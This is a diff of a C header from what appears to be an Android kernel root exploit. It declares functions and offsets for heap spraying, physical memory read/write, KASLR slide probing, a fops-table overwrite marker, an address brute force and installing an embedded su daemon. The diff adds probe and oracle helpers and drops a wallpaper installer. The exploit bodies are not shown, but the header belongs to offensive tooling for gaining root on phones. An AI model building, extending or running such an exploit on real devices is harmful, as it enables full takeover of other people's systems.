@@ -67,6 +67,11 @@
 #define FOPS_TABLE_OFF FOPS_OFF
 #define SKB_FRAG_BIAS 0
 
+#define ARM_MARK_OFF (FOPS_TABLE_OFF + SKB_DATA_DELTA + FOPS_LLSEEK_OFF)
+#define PROBE_MARK_OFF 0x300
+#define PROBE_MARK_DELTA \
+  (PROBE_MARK_OFF - (FOPS_TABLE_OFF + SKB_DATA_DELTA))
+
 #define FAKE_TASK_PRIO 120
 #define FAKE_WAITER_PRIO 130
 #define ASHMEM_NAME_PREFIX_LEN 11
@@ -177,8 +182,6 @@ struct root_report {
   int su_install_ret;
   int su_install_errno;
   pid_t su_daemon_pid;
-  int wallpaper_ret;
-  int wallpaper_errno;
 };
 
 struct root_shared {
@@ -272,6 +275,7 @@ extern uintptr_t pipebuf_page_base;
 extern uintptr_t pipebuf_addr;
 extern int pipebuf_pipe_idx;
 extern char physrw_readback[64];
+void util_stack_page_scan(const char *tag, uint64_t pcv);
 extern char physrw_after_write[64];
 extern int physrw_read_ok;
 extern int physrw_write_ok;
@@ -341,7 +345,6 @@ extern int memfd_leak;
 
 int run_exploit(int argc, char **argv);
 int install_embedded_su(pid_t *daemon_pid);
-int install_embedded_wallpaper(void);
 void read_first_line(const char *path, char *buf, size_t len);
 void log_startup_context(void);
 void log_slide_child_context(void);
@@ -376,6 +379,8 @@ int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
 void setup_kernelsnitch(void);
+void gl_pre_cache_cpuinfo(void);
+long gl_get_cpu_count(void);
 int kernelsnitch_collisions_ready(void);
 void run_kernelsnitch_bruteforce(void);
 uintptr_t current_kernelsnitch_mm_struct(void);
@@ -385,7 +390,15 @@ void free_ctx_storage(struct mm_ctx *ctx);
 void cleanup_page_prepare_state(void);
 void util_reclaim_payload_spray(void);
 int util_frame_regrab_burst(void);
+int util_frame_oracle(const char *tag);
+int util_frame_oracle_marker(const char *tag, uint64_t marker,
+                             size_t marker_off);
+void util_v121e_mark_readback(const char *when);
+int util_v129_prego_gate(int probe_fd, uint64_t glk, const char *when);
+void util_frame_band_dump(const char *tag);
 int util_frame_guard(int probe_fd);
+void util_mark_fops_armed(const char *why);
+int util_fops_armed(void);
 int slide_probe_cached_fd(void);
 void util_set_oom_protect(void);
 int clone_memfd(void);
@@ -394,6 +407,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
 int payload_peek_fd(void);
+const unsigned char *payload_template(void);
 
 void fdset_put_word(fd_set *set, int word, uint64_t value);
 uint64_t fdset_get_word(const fd_set *set, int word);
